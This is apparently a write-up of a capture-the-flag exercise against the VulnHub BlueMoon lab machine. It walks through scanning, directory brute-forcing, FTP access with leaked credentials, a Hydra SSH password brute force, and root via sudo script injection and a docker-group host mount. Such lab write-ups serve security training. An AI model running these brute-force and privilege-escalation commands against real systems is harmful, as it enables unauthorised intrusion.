## Introduction
This report presents the results of a penetration‑testing exercise conducted on the Bluemoon: 2021 virtual machine from VulnHub. The activity was carried out using Kali Linux as the attacker platform, with the objective of practicing reconnaissance, exploitation, and privilege escalation techniques in a controlled cybersecurity learning environment.

## Machine Details

| Item | Description |                       
|------|-------------|
| Machine Name | BlueMoon |
| Platform | VulnHub |
| Difficulty | Beginner |
| Type | Boot2Root |
| Goal | Obtain root access |

## Lab Setup
- Target Hostname: BlueMoon
- Target IP: 192.168.56.101
- Operating System: Debian GNU/Linux 10
- Attacker Host: 192.168.56.102
- Difficulty Level: Beginner 
- Goal: Obtain root access and capture the flag

# 1️ Reconnaissance
- Ran  bash```netdiscover``` to identify active hosts on the subnet.
- Verified attacker IP with bash```ifconfig```.
```bash
Used nmap -sn 192.168.56.0/24
``` 
   to perform a ping sweep and confirm the target machine’s presence.

# 2️ Service Enumeration
A detailed scan with 
```bash
nmap -sC -sV -Pn revealed:
```
- FTP (21/tcp) – vsftpd 3.0.3
- SSH (22/tcp) – OpenSSH 7.9p1
- HTTP (80/tcp) – Apache 2.4.38

# 3️ Web Exploration

Once the initial port scan revealed that the target was running an Apache web server on port 80, the next logical step was to investigate the web application for hidden content and potential entry points. This stage focused on directory enumeration and content discovery, which are essential in penetration testing because many misconfigurations or forgotten files can expose sensitive information.

- Tools Used bash```dirb``` with a custom wordlist to brute‑force directories.
```bash
dirb http://192.168.56.105 ~/Desktop/wordlist.txt -X .php,.html,.txt
```
Purpose: These tools automate the process of guessing common directory and file names on a web server. Administrators often leave backup files, test scripts, or hidden paths that are not linked on the main site but are still accessible if you know the URL.

Approach:
- Discovered bash```/hidden_text``` via bash```gobuster```.
- The hidden page contained a QR code image.
- Decoding the QR revealed FTP credentials:
```bash
userftp : fttp@ssword
```

# 4️ FTP Access

After uncovering valid FTP credentials during the web exploration phase, the next step was to test connectivity to the FTP service running on port 21. This stage was crucial because FTP often exposes sensitive files if misconfigured or left with weak authentication
```bash
ftp 192.168.56.101
```
Purpose: 
Establish a session with the target’s FTP server using the credentials obtained earlier bash```(userftp: fttp@ssword).```

Observation:
The login was successful, confirming that the leaked credentials were valid and granting access to the server’s file system.

Directory Enumeration
- Once inside, the bash```ls``` command was executed to list available files.
- Two files stood out
  - bash```information.txt```
  - bash```p_lists.txt```
- These files appeared to contain user-related data and potential password hints.

File Retrieve
- To analyze the files safely, they were downloaded to the attacker's machine using the bash```get``` command:

```bash
get information.txt
get p_lists.txt
```

File Analysis
- bash```information.txt:``` Contained a note referencing a user named robin, along with a clue suggesting weak password practices.
- bash```p_lists.txt:``` Provided a custom wordlist filled with common and leetspeak‑style passwords. This was clearly intended to be used for brute‑force attempts.

# 5️ User Shell via SSH
- Used Hydra to brute‑force SSH with the provided wordlist:
```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.101
```
- Valid credentials discovered:
robin : k4rv3ndh4nh4ck3r
- Logged in successfully with
```bash
  ssh robin@192.168.56.101.
```

# 6️ Privilege Escalation
Robin → Jerry
- Exploited feedback.sh with sudo rights, injecting /bin/bash.
- Switched to user jerry.
- Upgraded shell using Python:
python3
```bash
-c 'import pty; pty.spawn("/bin/bash")'
```
- Found jerry was part of the docker group.
Jerry → Root
- Verified Docker images were available.
- Mounted host filesystem inside a container:
docker run
```bash
-v /:/mnt --rm -it alpine chroot /mnt sh
```
- Escalated privileges to root.
- Retrieved final flag:
  
```Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}```
